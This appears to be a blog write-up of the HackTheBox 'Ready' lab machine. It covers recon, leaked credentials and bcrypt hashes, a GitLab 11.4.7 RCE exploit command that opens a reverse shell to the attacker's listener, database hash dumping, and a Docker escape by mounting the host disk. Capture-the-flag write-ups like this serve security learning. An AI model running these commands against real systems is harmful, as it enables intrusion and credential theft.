@@ -1,0 +1,206 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Ready // SixPraxis</title>
+    <link rel="shortcut icon" href="/images/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="SixPraxis" />
+    <meta name="description" content="Write Up for HackTheBox&#39;s Ready" />
+    <link rel="stylesheet" href="https://sixpraxis.github.io/css/main.min.ce339e9f134fb14a441d35fa55b6b8b5fb176d6d1ab2dc3a19ff1022bd4c15e2.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Ready"/>
+<meta name="twitter:description" content="Write Up for HackTheBox&#39;s Ready"/>
+
+    <meta property="og:title" content="HTB - Ready" />
+<meta property="og:description" content="Write Up for HackTheBox&#39;s Ready" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sixpraxis.github.io/posts/ready/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-05-06T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-05-06T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sixpraxis.github.io"><img class="app-header-avatar" src="/images/avatar.png" alt="SixPraxis" /></a>
+      <h1>SixPraxis</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Mostly interested in networking and cyber security, but into all sorts of things.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sixpraxis" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://app.hackthebox.eu/profile/139574" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-htb">
+  <title>HackTheBox</title>
+  <path d="M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z" fill="#626262"/>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Ready</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          May 6, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sixpraxis.github.io/tags/hackthebox/">hackthebox</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/ready/">ready</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/medium/">medium</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="ready">Ready</h1>
+<p><img src="/images/htb-ready/ready.png" alt="Ready"></p>
+<h3 id="contents">Contents</h3>
+<ul>
+<li><a href="#WriteUp">Write Up</a></li>
+<li><a href="#Recon">Recon</a></li>
+<li><a href="#Credentials">Credentials</a></li>
+<li><a href="#Notes">Notes</a></li>
+</ul>
+<h2 id="WriteUp">Write Up</h2>
+<p>Two open ports, 22 and a web server on 5080. The web server is hosting an instance of GitLab. Signing up works without verification and lets me onto the GitLab dashboard. There&rsquo;s one public project called ready-channel, created by user &ldquo;dude&rdquo;. The project repo houses a drupal install and we pick up some mysql credentials(<code>drupaluser : %%cHzhNC=k9yYN!T</code>) from the settings.php file. The GitLab version that&rsquo;s running is CE 11.4.7, which has an authenticated RCE vulnerability. <code>python3 49334.py -u test1 -p password1 -g http://ready.htb -l 10.10.14.8 -P 4040</code> pops a reverse shell on our listener as the git user. <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> to upgrade our shell. We&rsquo;re able to pick up the user flag from dude&rsquo;s home folder.</p>
+<p><img src="/images/htb-ready/ready1.png" alt="User flag"></p>
+<p>Now that we&rsquo;re in, we know that the GitLab install has the dude account and password inside it&rsquo;s database, so that&rsquo;s our next target. <code>/var/opt/gitlab/gitlab-rails/etc/database.yml</code> contains the information we need to log in to the GitLab postgresql database.</p>
+<pre><code>psql -h /var/opt/gitlab/postgresql -p 5432 -U gitlab -d gitlabhq_production
+\pset pager 0
+\dt
+\d+ users
+SELECT username,email,encrypted_password FROM users;
+</code></pre><p>After a few hours of running hashcat with rockyou, this probably isn&rsquo;t the path we&rsquo;re supposed to take. There is a file called root_pass that has <code>YG65407Bjqvv9A0a8Tm_7w</code> in it, but that doesn&rsquo;t seem to work with any login points. The .dockerenv file suggests we&rsquo;re inside of a docker container as well. After tons of manual searching and enumeration, I load up linpeas and it finds a password I didn&rsquo;t catch before. <code>/opt/backup/gitlab.rb:gitlab_rails['smtp_password'] = &quot;wW59U!ZKMbG9+*#h&quot;</code>. Testing this password with su gets us logged into root. Now we need to escape the docker container.</p>
+<p>fdisk -l shows we have access to the /dev/sda disk.</p>
+<pre><code>Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: gpt
+Disk identifier: 32558524-85A4-4072-AA28-FA341BE86C2E
+
+Device        Start      End  Sectors Size Type
+/dev/sda1      2048     4095     2048   1M BIOS boot
+/dev/sda2      4096 37746687 37742592  18G Linux filesystem
+/dev/sda3  37746688 41940991  4194304   2G Linux swap
+</code></pre><p>After creating a directory in /mnt/, I&rsquo;m able to mount sda2 and navigate into the file system outside of the docker container. The root folder contains our flag.</p>
+<p><img src="/images/htb-ready/ready2.png" alt="Root flag"></p>
+<hr>
+<h2 id="Recon">Recon</h2>
+<p>Initial Scan:</p>
+<pre><code>nmap -sV $READY
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+5080/tcp open  http    nginx
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Script/version scan:</p>
+<pre><code>nmap -sC -sV -p22,5080 10.10.10.220
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+5080/tcp open  http    nginx
+| http-robots.txt: 53 disallowed entries (15 shown)
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+|_/s/ /snippets/new /snippets/*/edit
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was http://ready.htb:5080/users/sign_in
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>WFuzz:</p>
+<pre><code>wfuzz -c -u http://ready.htb:5080/FUZZ/ -w /usr/share/wordlists/dirb/common.txt --hc 404,401,302
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                 
+=====================================================================
+000001575:   301        0 L      5 W        171 Ch      &quot;favicon.ico&quot;                           
+000001536:   200        244 L    779 W      13035 Ch    &quot;explore&quot;                               
+000001886:   200        229 L    2389 W     37655 Ch    &quot;help&quot;                                  
+000003207:   200        245 L    785 W      13114 Ch    &quot;public&quot;                                
+000003436:   200        72 L     207 W      2095 Ch     &quot;robots.txt&quot;                            
+000003441:   200        299 L    938 W      15493 Ch    &quot;root&quot;                                  
+000003525:   200        200 L    731 W      12392 Ch    &quot;search&quot;                                
+000004008:   200        299 L    938 W      15452 Ch    &quot;test&quot;                                  
+000004010:   200        299 L    938 W      15475 Ch    &quot;test1&quot; 
+</code></pre><hr>
+<h2 id="Credentials">Credentials</h2>
+<h4 id="mysql">MySQL:</h4>
+<p><a href="http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/settings.php">http://ready.htb:5080/dude/ready-channel/blob/master/sites/default/settings.php</a></p>
+<pre><code>      'database' =&gt; 'drupal',
+      'username' =&gt; 'drupaluser',
+      'password' =&gt; '%%cHzhNC=k9yYN!T',
+      'host' =&gt; 'localhost',
+</code></pre><h4 id="postgresql">Postgresql</h4>
+<p>/var/opt/gitlab/gitlab-rails/etc/database.yml</p>
+<pre><code>  database: gitlabhq_production
+  pool: 10
+  username: &quot;gitlab&quot;
+  password: 
+  host: &quot;/var/opt/gitlab/postgresql&quot;
+  port: 5432
+</code></pre><h4 id="gitlab">GitLab</h4>
+<pre><code>             username             |                   email                   |                      encrypted_password                      
+----------------------------------+-------------------------------------------+--------------------------------------------------------------
+ root                             | admin@example.com                         | $2a$10$.Kc4bwq3BqLCEzAGJVIJFeK4emNnucvAqk1vCv4Yp45yy2nmrFa.2
+ test1                            | test1@test.test                           | $2a$10$3UWZ0vuKf/AHOjphoObmRO4Y2fACSFmdeRmU5iKUT/TNyDgWltJba
+ mitroglou                        | mitroglou@ready.com                       | $2a$10$4vZAglOnEdNEe1SoNj1IE.RfotOt9gPnOXBEihjd7QBhsUmgmAdLi
+ dude                             | dude@ready.com                            | $2a$10$NOMTXhO31vqykicMa6zj3O.F5PIyI9q/S4c.v22eMSfXNDdtpI2Mm
+ test                             | test@test.gr                              | $2a$10$7xK1UPcwvjWIo4ioCz28GeFSt.NR00AHsY2AF.gWzaWwikRVXCTXa
+ eb8a31bc5f2e4f8284c5a18b115cef77 | eb8a31bc5f2e4f8284c5a18b115cef77@mail.htb | $2a$10$.aOidQ2aprnoXvfDNyNfGOuMLqcLkPljHsPeV8j7BZA4GU.5p1ZXm
+</code></pre><h4 id="host">Host:</h4>
+<pre><code>git : 
+</code></pre><h4 id="misc">Misc:</h4>
+<pre><code>/opt/backup/gitlab.rb:gitlab_rails['smtp_password'] = &quot;wW59U!ZKMbG9+*#h&quot;
+</code></pre><hr>
+<h2 id="Notes">Notes</h2>
+<ul>
+<li>GitLab Community Edition 11.4.7</li>
+<li>/var/opt/gitlab/gitlab-rails/etc/secrets.yml</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
